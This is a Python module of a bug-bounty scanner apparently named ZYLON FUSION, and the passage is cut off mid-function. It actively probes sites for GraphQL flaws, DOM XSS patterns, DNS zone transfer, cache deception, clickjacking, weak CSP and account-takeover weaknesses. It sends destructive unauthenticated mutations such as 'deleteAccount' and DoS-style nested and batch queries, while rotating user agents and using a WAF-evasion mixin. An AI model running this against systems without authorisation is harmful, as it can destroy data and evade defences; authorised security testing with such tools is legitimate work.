#!/usr/bin/env python3
"""
ZYLON FUSION v2.0 - Advanced Security Engine 3
GraphQL | DOM XSS | Reverse IP | DNS Zone Transfer | Cache Deception |
Clickjacking | CSP | ATO | OAuth | HTTP Method | Shodan InternetDB |
Favicon Hash | Pastebin Dork | URL Shortener | Security.txt |
Blind XSS | WebSocket | 2FA Bypass | Mixed Content | Info Disclosure

Bug Bounty Hunter Edition - Termux Non-Root Compatible
"""

import re
import json
import time
import socket
import struct
import base64
import hashlib
import random
import requests
import threading
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup

try:
    import dns.resolver
    import dns.query
    import dns.zone
    DNS_FULL = True
except ImportError:
    try:
        import dns.resolver
        DNS_FULL = False
    except ImportError:
        DNS_FULL = False

from core.var import USER_AGENTS, DEFAULT_TIMEOUT, VERIFY_SSL, MAX_THREADS

from core.shared_infra import shared_session, regex_cache, WAFEvasionMixin


class V3SecurityEngine(WAFEvasionMixin):
    """V3.0 Security Engine: 20 Advanced Bug Bounty Modules"""

    def __init__(self, session=None):
        super().__init__()
        self.session = session or shared_session
        self.session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
        self.session.verify = VERIFY_SSL

    def _rotate_ua(self):
        self.session.headers.update({'User-Agent': random.choice(USER_AGENTS)})

    # ========================================================================
    # 56: GRAPHQL SECURITY TESTER
    # ========================================================================

    def scan_graphql(self, url):
        """
        Test GraphQL endpoints for security misconfigurations.
        Tests: Introspection, Field Suggestion, Query Depth, Mutation abuse, Batch queries.
        """
        result = {'vulnerable': False, 'findings': [], 'tested': 0, 'graphql_found': False}

        # Find GraphQL endpoint
        graphql_urls = self._find_graphql_endpoints(url)
        if not graphql_urls:
            # Try common paths
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            common_paths = ['/graphql', '/graphiql', '/api/graphql', '/api/v1/graphql',
                          '/v1/graphql', '/v2/graphql', '/query', '/gql', '/api/gql',
                          '/api/graph', '/graphql/console', '/altair']
            for path in common_paths:
                try:
                    self._rotate_ua()
                    resp = self.session.get(f"{base}{path}", timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
                    if resp.status_code == 200 and ('graphql' in resp.text.lower() or 'data' in resp.text.lower()):
                        graphql_urls.append(f"{base}{path}")
                except Exception:
                    continue

        if not graphql_urls:
            result['findings'].append({
                'type': 'No GraphQL Endpoint Found',
                'severity': 'Info',
                'note': 'No GraphQL endpoint detected'
            })
            return result

        result['graphql_found'] = True
        result['endpoints'] = graphql_urls

        for gql_url in graphql_urls:
            # Test 1: Introspection Query
            result['tested'] += 1
            try:
                introspection_query = {
                    "query": "{ __schema { queryType { name } mutationType { name } types { name fields { name } } } }"
                }
                self._rotate_ua()
                resp = self.session.post(gql_url, json=introspection_query,
                                        timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        if '__schema' in str(data) or 'queryType' in str(data):
                            result['vulnerable'] = True
                            result['findings'].append({
                                'type': 'GraphQL Introspection Enabled',
                                'url': gql_url,
                                'severity': 'Medium',
                                'note': 'Full schema exposed via introspection - reveals all queries/mutations/types'
                            })
                    except Exception:
                        pass
            except Exception:
                pass

            # Test 2: Field Suggestion
            result['tested'] += 1
            try:
                suggestion_query = {"query": "{ userz { name } }"}
                self._rotate_ua()
                resp = self.session.post(gql_url, json=suggestion_query,
                                        timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
                if resp.status_code == 200:
                    text = resp.text.lower()
                    if 'did you mean' in text or 'suggestion' in text or 'did you' in text:
                        result['vulnerable'] = True
                        result['findings'].append({
                            'type': 'GraphQL Field Suggestion Enabled',
                            'url': gql_url,
                            'severity': 'Low',
                            'note': 'Field suggestions help attackers discover valid field names'
                        })
            except Exception:
                pass

            # Test 3: Query Depth / DoS
            result['tested'] += 1
            try:
                depth_query = {
                    "query": "{ " * 15 + "user { " * 15 + "id" + " } " * 15 + " } " * 15
                }
                start_time = time.time()
                self._rotate_ua()
                resp = self.session.post(gql_url, json=depth_query,
                                        timeout=15, verify=VERIFY_SSL)
                elapsed = time.time() - start_time
                if resp.status_code == 200 and elapsed < 1:
                    result['findings'].append({
                        'type': 'No Query Depth Limiting',
                        'url': gql_url,
                        'response_time': f'{elapsed:.2f}s',
                        'severity': 'Medium',
                        'note': 'Deeply nested queries accepted - potential DoS vector'
                    })
            except Exception:
                pass

            # Test 4: Mutation without Auth
            result['tested'] += 1
            try:
                mutation_queries = [
                    {"query": "mutation { createUser(input: {email: \"zylon@test.com\"}) { id } }"},
                    {"query": "mutation { updateEmail(input: {email: \"zylon@test.com\"}) { id } }"},
                    {"query": "mutation { deleteAccount { success } }"},
                ]
                for mq in mutation_queries:
                    self._rotate_ua()
                    resp = self.session.post(gql_url, json=mq,
                                            timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
                    if resp.status_code == 200:
                        try:
                            data = resp.json()
                            errors = data.get('errors', [])
                            if not errors or 'not authorized' not in str(errors).lower():
                                result['findings'].append({
                                    'type': 'Unauthenticated Mutation',
                                    'url': gql_url,
                                    'query': mq['query'][:60],
                                    'severity': 'High',
                                    'note': 'Mutation accepted without authentication'
                                })
                        except Exception:
                            pass
            except Exception:
                pass

            # Test 5: Batch Query Attack
            result['tested'] += 1
            try:
                batch_query = [
                    {"query": "{ __typename }"} for _ in range(50)
                ]
                self._rotate_ua()
                resp = self.session.post(gql_url, json=batch_query,
                                        timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
                if resp.status_code == 200:
                    result['findings'].append({
                        'type': 'Batch Query Accepted',
                        'url': gql_url,
                        'batch_size': 50,
                        'severity': 'Medium',
                        'note': 'Batch queries accepted - potential for rate limit bypass and DoS'
                    })
            except Exception:
                pass

            # Test 6: Error Disclosure
            result['tested'] += 1
            try:
                error_query = {"query": "{ INVALID_SYNTAX_ERROR_TEST }"}
                self._rotate_ua()
                resp = self.session.post(gql_url, json=error_query,
                                        timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        errors = data.get('errors', [])
                        if errors:
                            error_msg = str(errors[0])
                            if any(x in error_msg.lower() for x in ['stack', 'trace', 'line', 'column', 'at ']):
                                result['findings'].append({
                                    'type': 'Verbose Error Messages',
                                    'url': gql_url,
                                    'severity': 'Low',
                                    'note': 'GraphQL errors expose internal details'
                                })
                    except Exception:
                        pass
            except Exception:
                pass

        return result

    def _find_graphql_endpoints(self, url):
        """Find GraphQL endpoints by parsing the page"""
        endpoints = []
        try:
            resp = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            # Check script tags for GraphQL URLs
            if 'graphql' in resp.text.lower():
                soup = BeautifulSoup(resp.text, 'html.parser')
                for script in soup.find_all('script'):
                    src = script.get('src', '')
                    if 'graphql' in src.lower():
                        endpoints.append(urljoin(url, src))

                # Check for graphql in inline scripts
                for script in soup.find_all('script'):
                    if script.string and 'graphql' in script.string.lower():
                        # Try to extract URL
                        urls = regex_cache.findall(r'["\']([^"\']*graphql[^"\']*)["\']', script.string, re.I)
                        for u in urls:
                            endpoints.append(urljoin(url, u))
        except Exception:
            pass
        return list(set(endpoints))

    # ========================================================================
    # 57: DOM-BASED XSS SCANNER
    # ========================================================================

    def scan_dom_xss(self, url):
        """
        Detect potential DOM-based XSS vulnerabilities.
        Analyzes JavaScript for sources → sinks patterns.
        """
        result = {'vulnerable': False, 'findings': [], 'tested': 0}

        # DOM XSS Sources (where user input enters)
        sources = [
            'document.location', 'location.href', 'location.hash',
            'location.search', 'location.pathname', 'window.location',
            'window.name', 'document.referrer', 'document.URL',
            'document.cookie', 'postMessage', 'window.opener',
            'location.hostname', 'location.port', 'location.protocol',
            'document.baseURI', 'document.documentURI',
        ]

        # DOM XSS Sinks (where user input is executed)
        sinks = [
            'innerHTML', 'outerHTML', 'document.write', 'document.writeln',
            'eval(', 'setTimeout("', 'setInterval("', 'Function(',
            'execScript(', 'setImmediate("', '$.globalEval(',
            'location.assign(', 'location.replace(', 'location =',
            'document.domain =', 'element.src =', 'element.href =',
            'element.action =', 'element.setAttribute("href"',
            'element.setAttribute("src"', 'element.setAttribute("action"',
            'jQuery(', '$(', 'append(', 'prepend(', 'after(', 'before(',
            'insertAdjacentHTML(', 'write(', 'writeln(',
            'script.src', 'script.text', 'script.textContent',
            'script.innerText', 'iframe.src', 'embed.src',
            'object.data', 'form.action', 'input.formaction',
            'button.formaction', 'base.href', 'a.href',
        ]

        # Source-Sink dangerous combinations
        dangerous_patterns = [
            (r'location\.(href|hash|search|pathname).*?innerHTML', 'location → innerHTML', 'Critical'),
            (r'location\.(href|hash|search|pathname).*?outerHTML', 'location → outerHTML', 'Critical'),
            (r'location\.(href|hash|search|pathname).*?document\.write', 'location → document.write', 'Critical'),
            (r'location\.(href|hash|search|pathname).*?eval\s*\(', 'location → eval()', 'Critical'),
            (r'document\.URL.*?innerHTML', 'document.URL → innerHTML', 'Critical'),
            (r'document\.URL.*?document\.write', 'document.URL → document.write', 'Critical'),
            (r'document\.referrer.*?innerHTML', 'document.referrer → innerHTML', 'High'),
            (r'window\.name.*?innerHTML', 'window.name → innerHTML', 'High'),
            (r'window\.name.*?eval\s*\(', 'window.name → eval()', 'High'),
            (r'location\.hash.*?eval\s*\(', 'location.hash → eval()', 'Critical'),
            (r'location\.hash.*?setTimeout', 'location.hash → setTimeout', 'High'),
            (r'postMessage.*?innerHTML', 'postMessage → innerHTML', 'High'),
            (r'postMessage.*?eval\s*\(', 'postMessage → eval()', 'High'),
            (r'location\.search.*?jQuery\s*\(', 'location.search → jQuery()', 'High'),
            (r'location\.href.*?\.src\s*=', 'location.href → .src', 'High'),
        ]

        # Collect JavaScript files
        js_files = self._collect_js_files(url)

        for js_url in js_files[:30]:
            result['tested'] += 1
            try:
                self._rotate_ua()
                resp = self.session.get(js_url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
                if resp.status_code != 200:
                    continue
                js_content = resp.text

                # Check for source-sink patterns
                for pattern, desc, severity in dangerous_patterns:
                    matches = regex_cache.compile(pattern, re.IGNORECASE | re.DOTALL).finditer(js_content)
                    for match in matches:
                        # Get surrounding context
                        start = max(0, match.start() - 80)
                        end = min(len(js_content), match.end() + 80)
                        context = js_content[start:end].replace('\n', ' ').strip()

                        result['vulnerable'] = True
                        result['findings'].append({
                            'type': 'DOM XSS Source → Sink',
                            'pattern': desc,
                            'js_file': js_url,
                            'context': context,
                            'severity': severity,
                            'note': f'User-controlled source flows into dangerous sink'
                        })

                # Check for individual sources and sinks
                found_sources = [s for s in sources if s in js_content]
                found_sinks = [s for s in sinks if s in js_content]

                if found_sources and found_sinks:
                    result['findings'].append({
                        'type': 'Potential DOM XSS',
                        'js_file': js_url,
                        'sources': found_sources[:5],
                        'sinks': found_sinks[:5],
                        'severity': 'Medium',
                        'note': 'Both sources and sinks found - manual verification needed'
                    })

            except Exception:
                continue

        # Also check inline scripts on the main page
        try:
            self._rotate_ua()
            resp = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            soup = BeautifulSoup(resp.text, 'html.parser')
            for script in soup.find_all('script'):
                if script.string and len(script.string) > 50:
                    for pattern, desc, severity in dangerous_patterns:
                        if regex_cache.search(pattern, script.string, re.IGNORECASE | re.DOTALL):
                            result['vulnerable'] = True
                            result['findings'].append({
                                'type': 'DOM XSS in Inline Script',
                                'pattern': desc,
                                'severity': severity,
                                'note': 'Source → sink found in inline script'
                            })
        except Exception:
            pass

        return result

    def _collect_js_files(self, url):
        """Collect JavaScript file URLs from a page"""
        js_files = []
        try:
            resp = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            soup = BeautifulSoup(resp.text, 'html.parser')

            # Script src tags
            for script in soup.find_all('script', src=True):
                js_url = urljoin(url, script['src'])
                js_files.append(js_url)

            # Inline references to JS
            for match in regex_cache.compile(r'["\']([^"\']*\.js[^"\']*)["\']').finditer(resp.text):
                js_url = urljoin(url, match.group(1))
                js_files.append(js_url)
        except Exception:
            pass
        return list(set(js_files))

    # ========================================================================
    # 58: REVERSE IP LOOKUP
    # ========================================================================

    def reverse_ip_lookup(self, domain):
        """
        Find all domains hosted on the same IP address.
        Uses: Bing reverse IP, HackerTarget API, ViewDNS.
        """
        result = {'domains': [], 'ip': None, 'total': 0, 'sources': {}}

        # Resolve domain to IP
        try:
            ip = socket.gethostbyname(domain)
            result['ip'] = ip
        except socket.gaierror:
            result['error'] = f'Cannot resolve {domain}'
            return result

        # Source 1: HackerTarget API (free, no key)
        try:
            api_url = f"https://api.hackertarget.com/reverseiplookup/?q={ip}"
            self._rotate_ua()
            resp = self.session.get(api_url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            if resp.status_code == 200 and 'error' not in resp.text.lower():
                domains = [d.strip() for d in resp.text.strip().split('\n') if d.strip()]
                result['sources']['hackertarget'] = domains
                result['domains'].extend(domains)
        except Exception:
            pass

        # Source 2: Bing reverse IP search
        try:
            bing_url = f"https://www.bing.com/search?q=ip%3A{ip}"
            self._rotate_ua()
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            resp = self.session.get(bing_url, headers=headers, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            if resp.status_code == 200:
                # Extract domains from search results
                domain_pattern = regex_cache.compile(r'https?://([a-zA-Z0-9._-]+)')
                found = domain_pattern.findall(resp.text)
                # Filter to only domain names (not bing itself)
                filtered = [d for d in found if 'bing' not in d.lower() and 'microsoft' not in d.lower()
                           and d.count('.') >= 1 and not d.startswith('.') and len(d) < 100]
                result['sources']['bing'] = list(set(filtered))[:50]
                result['domains'].extend(filtered)
        except Exception:
            pass

        # Source 3: ViewDNS.info
        try:
            viewdns_url = f"https://viewdns.info/reverseip/?host={ip}&t=1"
            self._rotate_ua()
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            resp = self.session.get(viewdns_url, headers=headers, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            if resp.status_code == 200:
                soup = BeautifulSoup(resp.text, 'html.parser')
                # Look for domain table
                for table in soup.find_all('table'):
                    for row in table.find_all('tr'):
                        cols = row.find_all('td')
                        if len(cols) >= 1:
                            domain_text = cols[0].get_text(strip=True)
                            if domain_text and '.' in domain_text and domain_text != ip:
                                result['sources'].setdefault('viewdns', []).append(domain_text)
                                result['domains'].append(domain_text)
        except Exception:
            pass

        # Deduplicate
        result['domains'] = sorted(list(set(result['domains'])))
        result['total'] = len(result['domains'])

        return result

    # ========================================================================
    # 59: DNS ZONE TRANSFER TEST
    # ========================================================================

    def test_dns_zone_transfer(self, domain):
        """
        Test for DNS zone transfer (AXFR) vulnerability.
        If successful, dumps the entire DNS zone - critical info leak.
        """
        result = {'vulnerable': False, 'records': [], 'nameservers': [], 'tested': 0}

        # Get nameservers
        if DNS_FULL or True:  # Try with dns.resolver
            try:
                import dns.resolver
                ns_answers = dns.resolver.resolve(domain, 'NS')
                for rdata in ns_answers:
                    ns = str(rdata.target).rstrip('.')
                    result['nameservers'].append(ns)
            except Exception:
                # Fallback: use common DNS
                try:
                    answers = dns.resolver.resolve(domain, 'NS')
                    for rdata in answers:
                        ns = str(rdata.target).rstrip('.')
                        result['nameservers'].append(ns)
                except Exception:
                    result['error'] = 'Cannot resolve NS records'
                    return result

        if not result['nameservers']:
            result['error'] = 'No nameservers found'
            return result

        # Attempt zone transfer on each nameserver
        for ns in result['nameservers']:
            result['tested'] += 1
            try:
                # Resolve NS to IP
                ns_ip = socket.gethostbyname(ns)

                if DNS_FULL:
                    # Try full zone transfer
                    zone = dns.zone.from_xfr(dns.query.xfr(ns_ip, domain, timeout=10))
                    result['vulnerable'] = True

                    for name, node in zone.nodes.items():
                        name_str = str(name)
                        for rdataset in node.rdatasets:
                            record = {
                                'name': f"{name_str}.{domain}" if name_str != '@' else domain,
                                'type': dns.rdatatype.to_text(rdataset.rdtype),
                                'ttl': rdataset.ttl,
                                'value': str(rdataset),
                                'nameserver': ns
                            }
                            result['records'].append(record)
                else:
                    # Try using dns.query directly
                    import dns.query
                    import dns.message
                    request = dns.message.make_query(domain, 'AXFR')
                    response = dns.query.tcp(request, ns_ip, timeout=10)
                    if response.answer:
                        result['vulnerable'] = True
                        for rrset in response.answer:
                            record = {
                                'name': str(rrset.name),
                                'type': dns.rdatatype.to_text(rrset.rdtype),
                                'ttl': rrset.ttl,
                                'value': str(rrset),
                                'nameserver': ns
                            }
                            result['records'].append(record)

            except dns.xfr.TransferError:
                result['findings'] = result.get('findings', [])
                result.setdefault('findings', []).append({
                    'nameserver': ns,
                    'status': 'Transfer denied - properly configured',
                    'severity': 'Info'
                })
            except Exception as e:
                result.setdefault('findings', []).append({
                    'nameserver': ns,
                    'status': f'Error: {str(e)[:50]}',
                    'severity': 'Info'
                })

        result['total_records'] = len(result['records'])

        return result

    # ========================================================================
    # 60: WEB CACHE DECEPTION
    # ========================================================================

    def scan_cache_deception(self, url):
        """
        Test for Web Cache Deception vulnerabilities.
        Unlike Cache Poisoning, this tricks the cache into storing sensitive pages.
        Path confusion: /profile.php/nonexistent.css
        """
        result = {'vulnerable': False, 'findings': [], 'tested': 0}

        # Get baseline response
        try:
            self._rotate_ua()
            baseline = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            baseline_text = baseline.text
            baseline_status = baseline.status_code
        except Exception:
            result['error'] = 'Cannot connect to target'
            return result

        # Cache deception path extensions
        cache_extensions = [
            '.css', '.js', '.png', '.jpg', '.gif', '.svg', '.ico',
            '.woff', '.woff2', '.ttf', '.eot', '.otf',
            '.txt', '.xml', '.json', '.pdf', '.doc',
        ]

        # Path confusion techniques
        path_tricks = [
            # Append extension to path
            lambda url, ext: f"{url}{ext}",
            # Append /nonexistent + extension
            lambda url, ext: f"{url}/nonexistent{ext}",
            # Append /zylon_test + extension
            lambda url, ext: f"{url}/zylon_test{ext}",
            # Semicolon trick
            lambda url, ext: f"{url};{ext[1:]}",
            # Hash trick
            lambda url, ext: f"{url}#{ext}",
            # Question mark trick
            lambda url, ext: f"{url}?{ext[1:]}=1",
            # Double extension
            lambda url, ext: f"{url}.html{ext}",
            # Path parameter
            lambda url, ext: f"{url};/zylon{ext}",
        ]

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for trick_fn in path_tricks:
            for ext in cache_extensions:
                result['tested'] += 1
                try:
                    test_url = trick_fn(base_url, ext)
                    self._rotate_ua()

                    # First request
                    resp1 = self.session.get(test_url, timeout=DEFAULT_TIMEOUT,
                                            verify=VERIFY_SSL, allow_redirects=False)

                    # Check if the response contains the same sensitive content
                    if resp1.status_code == 200:
                        # Compare response content
                        content_similarity = self._calculate_similarity(baseline_text, resp1.text)

                        if content_similarity > 0.8:
                            # Check if cache headers suggest it will be cached
                            cache_headers = {
                                k: v for k, v in resp1.headers.items()
                                if k.lower() in ['cache-control', 'x-cache', 'cf-cache-status',
                                               'age', 'vary', 'expires', 'pragma',
                                               'x-cache-hits', 'surrogate-key']
                            }

                            # Determine if the response is likely to be cached
                            likely_cached = False
                            cc = resp1.headers.get('Cache-Control', '').lower()
                            if 'public' in cc or ('max-age' in cc and 'no-cache' not in cc and 'no-store' not in cc):
                                likely_cached = True
                            if resp1.headers.get('X-Cache', '').lower() == 'hit':
                                likely_cached = True
                            if resp1.headers.get('CF-Cache-Status', '').lower() in ['hit', 'miss', 'expired']:
                                likely_cached = True
                            if resp1.headers.get('Age'):
                                likely_cached = True

                            if likely_cached:
                                result['vulnerable'] = True
                                result['findings'].append({
                                    'type': 'Web Cache Deception',
                                    'test_url': test_url,
                                    'similarity': f'{content_similarity:.0%}',
                                    'cache_headers': cache_headers,
                                    'severity': 'High',
                                    'note': 'Sensitive page cached with static file extension'
                                })

                except Exception:
                    continue

        return result

    def _calculate_similarity(self, text1, text2):
        """Calculate similarity ratio between two texts"""
        if not text1 or not text2:
            return 0
        len1, len2 = len(text1), len(text2)
        if len1 == 0 or len2 == 0:
            return 0
        # Simple similarity based on common substrings
        min_len = min(len1, len2)
        max_len = max(len1, len2)
        common = sum(1 for a, b in zip(text1, text2) if a == b)
        return common / max_len if max_len > 0 else 0

    # ========================================================================
    # 61: CLICKJACKING DETECTOR
    # ========================================================================

    def scan_clickjacking(self, url):
        """
        Detect clickjacking vulnerabilities.
        Check if X-Frame-Options and CSP frame-ancestors are properly set.
        Generate PoC HTML.
        """
        result = {'vulnerable': False, 'findings': [], 'tested': 1}

        try:
            self._rotate_ua()
            resp = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
        except Exception:
            result['error'] = 'Cannot connect to target'
            return result

        xfo = resp.headers.get('X-Frame-Options', '').upper()
        csp = resp.headers.get('Content-Security-Policy', '')
        csp_frame = ''

        # Parse CSP for frame-ancestors
        if csp:
            for directive in csp.split(';'):
                directive = directive.strip()
                if directive.startswith('frame-ancestors'):
                    csp_frame = directive
                    break

        # Check X-Frame-Options
        xfo_vulnerable = False
        if not xfo:
            xfo_vulnerable = True
            result['findings'].append({
                'type': 'Missing X-Frame-Options',
                'severity': 'Medium',
                'note': 'Page can be embedded in iframe - clickjacking possible'
            })
        elif xfo not in ['DENY', 'SAMEORIGIN']:
            xfo_vulnerable = True
            result['findings'].append({
                'type': 'Weak X-Frame-Options',
                'value': xfo,
                'severity': 'Medium',
                'note': f'X-Frame-Options is "{xfo}" - not DENY or SAMEORIGIN'
            })

        # Check CSP frame-ancestors
        csp_vulnerable = False
        if not csp_frame:
            csp_vulnerable = True
            result['findings'].append({
                'type': 'Missing CSP frame-ancestors',
                'severity': 'Medium',
                'note': 'No CSP frame-ancestors directive - clickjacking possible'
            })
        elif "'none'" not in csp_frame and "'self'" not in csp_frame:
            csp_vulnerable = True
            result['findings'].append({
                'type': 'Weak CSP frame-ancestors',
                'value': csp_frame,
                'severity': 'Medium',
                'note': f'CSP frame-ancestors allows external origins: {csp_frame}'
            })

        if xfo_vulnerable and csp_vulnerable:
            result['vulnerable'] = True

        # Generate PoC HTML
        if result['vulnerable'] or (xfo_vulnerable and csp_vulnerable):
            parsed = urlparse(url)
            poc_html = f'''<!DOCTYPE html>
<html>
<head><title>Clickjacking PoC</title></head>
<body>
<h1>Clickjacking PoC for {parsed.netloc}</h1>
<iframe src="{url}" width="800" height="600" style="opacity: 0.5; border: 2px solid red;"></iframe>
<p>If you can see the target site above, it is vulnerable to clickjacking.</p>
</body>
</html>'''
            result['poc_html'] = poc_html
            result['findings'].append({
                'type': 'Clickjacking PoC Generated',
                'severity': 'High',
                'note': 'Save the PoC HTML and open in browser to verify'
            })

        return result

    # ========================================================================
    # 62: CSP ANALYZER
    # ========================================================================

    def analyze_csp(self, url):
        """
        Analyze Content-Security-Policy header for bypass opportunities.
        Checks for unsafe-inline, unsafe-eval, wildcards, and misconfigurations.
        """
        result = {'vulnerable': False, 'findings': [], 'csp_directives': {}, 'tested': 1}

        try:
            self._rotate_ua()
            resp = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
        except Exception:
            result['error'] = 'Cannot connect to target'
            return result

        csp_header = resp.headers.get('Content-Security-Policy', '')

        if not csp_header:
            result['vulnerable'] = True
            result['findings'].append({
                'type': 'No Content-Security-Policy',
                'severity': 'Medium',
                'note': 'No CSP header found - no XSS mitigation in place'
            })
            return result

        # Parse CSP directives
        directives = {}
        for part in csp_header.split(';'):
            part = part.strip()
            if part:
                tokens = part.split()
                if tokens:
                    directive_name = tokens[0]
                    directive_values = tokens[1:]
                    directives[directive_name] = directive_values

        result['csp_directives'] = directives

        # Check for dangerous configurations
        # 1: unsafe-inline in script-src
        script_src = directives.get('script-src', directives.get('default-src', []))
        if "'unsafe-inline'" in script_src:
            result['vulnerable'] = True
            result['findings'].append({
                'type': 'unsafe-inline in script-src',
                'severity': 'High',
                'note': "'unsafe-inline' allows inline scripts - XSS can bypass CSP"
            })

        # 2: unsafe-eval in script-src
        if "'unsafe-eval'" in script_src:
            result['vulnerable'] = True
            result['findings'].append({
                'type': 'unsafe-eval in script-src',
                'severity': 'High',
                'note': "'unsafe-eval' allows eval() - XSS can bypass CSP"
            })

        # 3: Wildcard sources
        if '*' in script_src:
            result['vulnerable'] = True
            result['findings'].append({
                'type': 'Wildcard in script-src',
                'severity': 'High',
                'note': "'*' allows scripts from any origin - CSP is ineffective"
            })

        # 4: Missing default-src
        if 'default-src' not in directives:
            result['findings'].append({
                'type': 'Missing default-src',
                'severity': 'Medium',
                'note': 'No default-src fallback - some resource types may be unrestricted'
            })

        # 5: data: URI in script-src
        if 'data:' in script_src:
            result['vulnerable'] = True
            result['findings'].append({
                'type': 'data: URI in script-src',
                'severity': 'High',
                'note': "'data:' URIs allow inline script execution - XSS bypass"
            })

        # 6: http: in script-src (non-HTTPS)
        for value in script_src:
            if value.startswith('http:'):
                result['findings'].append({
                    'type': 'HTTP source in script-src',
                    'value': value,
                    'severity': 'Medium',
                    'note': f'HTTP source "{value}" can be MITMed to inject scripts'
                })

        # 7: Missing script-src
        if 'script-src' not in directives and 'default-src' not in directives:
            result['vulnerable'] = True
            result['findings'].append({
                'type': 'No script-src or default-src',
                'severity': 'High',
                'note': 'No script restrictions at all - CSP is ineffective against XSS'
            })

        # 8: Missing upgrade-insecure-requests
        if 'upgrade-insecure-requests' not in directives:
            result['findings'].append({
                'type': 'Missing upgrade-insecure-requests',
                'severity': 'Low',
                'note': 'Consider adding upgrade-insecure-requests to enforce HTTPS'
            })

        # 9: Check for base-uri (prevents base tag hijacking)
        if 'base-uri' not in directives:
            result['findings'].append({
                'type': 'Missing base-uri',
                'severity': 'Low',
                'note': 'No base-uri restriction - base tag hijacking possible'
            })

        # 10: object-src check
        object_src = directives.get('object-src', directives.get('default-src', []))
        if 'none' not in str(object_src) and '*' in str(object_src):
            result['findings'].append({
                'type': 'Weak object-src',
                'severity': 'Medium',
                'note': 'Flash/plugin content allowed - potential XSS vector'
            })

        return result

    # ========================================================================
    # 63: ACCOUNT TAKEOVER SUITE
    # ========================================================================

    def scan_account_takeover(self, url):
        """
        Test for Account Takeover vectors:
        Password reset token leakage, session fixation, login CSRF.
        """
        result = {'vulnerable': False, 'findings': [], 'tested': 0}

        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Test 1: Password Reset Token Leakage via Referer
        result['tested'] += 1
        reset_urls = self._find_password_reset_urls(url)
        for reset_url in reset_urls:
            try:
                self._rotate_ua()
                resp = self.session.get(reset_url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
                soup = BeautifulSoup(resp.text, 'html.parser')

                # Find external resources loaded on reset page
                for tag in soup.find_all(['img', 'script', 'link', 'iframe'], src=True):
                    src = tag.get('src', '')
                    if src.startswith('http') and parsed.netloc not in src:
                        result['findings'].append({
                            'type': 'Password Reset Token Leakage',
                            'url': reset_url,
                            'external_resource': src,
                            'severity': 'Critical',
                            'note': 'Token may leak via Referer header to external resources'
                        })

                # Check for token in URL
                if 'token' in reset_url.lower() or 'reset' in reset_url.lower():
                    if '?' in reset_url:
                        result['findings'].append({
                            'type': 'Reset Token in URL',
                            'url': reset_url,
                            'severity': 'High',
                            'note': 'Reset token exposed in URL - can be logged/stolen'
                        })
            except Exception:
                pass

        # Test 2: Login CSRF
        result['tested'] += 1
        login_urls = self._find_login_endpoints(url)
        for login_url in login_urls:
            try:
                self._rotate_ua()
                resp = self.session.get(login_url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
                soup = BeautifulSoup(resp.text, 'html.parser')

                # Check for CSRF token in login form
                has_csrf = False
                for form in soup.find_all('form'):
                    csrf_fields = form.find_all('input', {
                        'name': regex_cache.compile(r'csrf|token|_token|authenticity', re.I)
                    })
                    if csrf_fields:
                        has_csrf = True
                        break

                if not has_csrf:
                    result['vulnerable'] = True
                    result['findings'].append({
                        'type': 'Login CSRF',
                        'url': login_url,
                        'severity': 'Medium',
                        'note': 'No CSRF token in login form - attacker can force victim login'
                    })
            except Exception:
                pass

        # Test 3: Session Fixation
        result['tested'] += 1
        try:
            self._rotate_ua()
            # Set a custom session cookie
            test_cookie = {'session': 'zylon_fixation_test'}
            resp1 = self.session.get(base, cookies=test_cookie, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)

            # Check if our injected cookie is accepted
            resp2 = self.session.get(base, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            if 'zylon_fixation_test' in str(resp2.cookies):
                result['findings'].append({
                    'type': 'Potential Session Fixation',
                    'severity': 'High',
                    'note': 'Server accepts externally set session cookies'
                })
        except Exception:
            pass

        # Test 4: Password Reset Token Not Expiring
        result['tested'] += 1
        # This requires manual verification - we flag if reset endpoint exists
        if reset_urls:
            result['findings'].append({
                'type': 'Verify Token Expiry',
                'severity': 'Medium',
                'note': 'Manual test: Request password reset, use token after 24h - check if still valid'
            })

        return result

    def _find_password_reset_urls(self, url):
        """Find password reset endpoints"""
        reset_urls = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        reset_paths = [
            '/reset', '/reset-password', '/forgot-password', '/forgot',
            '/password-reset', '/auth/reset', '/auth/forgot',
            '/api/reset', '/api/v1/reset', '/account/reset',
            '/password/new', '/auth/recovery',
        ]

        for path in reset_paths:
            try:
                test_url = f"{base}{path}"
                self._rotate_ua()
                resp = self.session.get(test_url, timeout=5, verify=VERIFY_SSL)
                if resp.status_code == 200:
                    reset_urls.append(test_url)
            except Exception:
                continue
        return reset_urls

    def _find_login_endpoints(self, url):
        """Find login/auth endpoints"""
        login_urls = []
